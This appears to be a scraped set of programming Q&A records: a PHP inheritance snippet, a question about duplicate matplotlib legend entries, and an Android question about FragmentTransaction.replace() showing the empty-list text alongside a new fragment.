class ClassB extends ClassA
{
    function Draw()
    {
        parent::InvokeDraw();

        /* Drawing code ... */

    }
} invokeDraw Draw($a, $b, $c, $d, $e) parent::Draw($a, $b, $c, $d, $e)

@TITLE:Stop matplotlib repeating labels in legend
@CONTENT:Here is a very simplified example: xvalues = [2,3,4,6]

for x in xvalues:
    plt.axvline(x,color='b',label='xvalues')

plt.legend()
 The legend will now show 'xvalues' as a blue line 4 times in the legend. Is there a more elegant way of fixing this than the following? for i,x in enumerate(xvalues):
    if not i:
        plt.axvline(x,color='b',label='xvalues')
    else:
        plt.axvline(x,color='b')

@LINK:/questions/13446935/fragmenttransaction-replace-not-working
@TITLE:FragmentTransaction.replace() not working
@CONTENT:I have a ListFragment displaying a list of items that created by the user. I have a ListView with it's id set to "@android:id/list" and a TextView with the id "@android:id/empty". I have an action bar button to display a fragment to allow the user to create more entries for the list. Here is the onOptionsItemSelected() method: @Override
public boolean onOptionsItemSelected(MenuItem item) {
    Fragment frag = null;

    // Right now I only have code for the addCourse() fragment, will add more soon
    switch (item.getItemId()) {
    case R.id.addCourse:
        frag = new AddCourseFragment();
        break;
    default:
        return super.onOptionsItemSelected(item);
    }

    // The support library is being dumb and replace isn't actually 
    getFragmentManager().beginTransaction()
        .remove(this).add(getId(), frag).addToBackStack(null).commit();
    return true;

}
 The AddCourseFragment code is as follows: public class AddCourseFragment extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_addcourse, container, false);
//      if (view.findViewById(R.id.timesFrame)!=null) {
        Fragment timesFrag = new TimesFragment();
        getChildFragmentManager().beginTransaction()
            .add(R.id.timesFrame, timesFrag).commit();
//      }
    return view;
    }
}
 As expected, when the list is unpopulated, android shows the text in the TextView. I then hit the add course button and this happens: It shows the empty text as well as the new fragment.
@CODE:ListFragment ListView TextView onOptionsItemSelected() @Override
public boolean onOptionsItemSelected(MenuItem item) {
    Fragment frag = null;

    // Right now I only have code for the addCourse() fragment, will add more soon
    switch (item.getItemId()) {
    case R.id.addCourse:
        frag = new AddCourseFragment();
        break;
    default:
        return super.onOptionsItemSelected(item);
    }

    // The support library is being dumb and replace isn't actually 
    getFragmentManager().beginTransaction()
        .remove(this).add(getId(), frag).addToBackStack(null).commit();
    return true;

} public class AddCourseFragment extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_addcourse, container, false);
//      if (view.findViewById(R.id.timesFrame)!=null) {
        Fragment timesFrag = new TimesFragment();
        getChildFragmentManager().beginTransaction()
            .add(R.id.timesFrame, timesFrag).commit();
//      }
    return view;
    }
} TextView
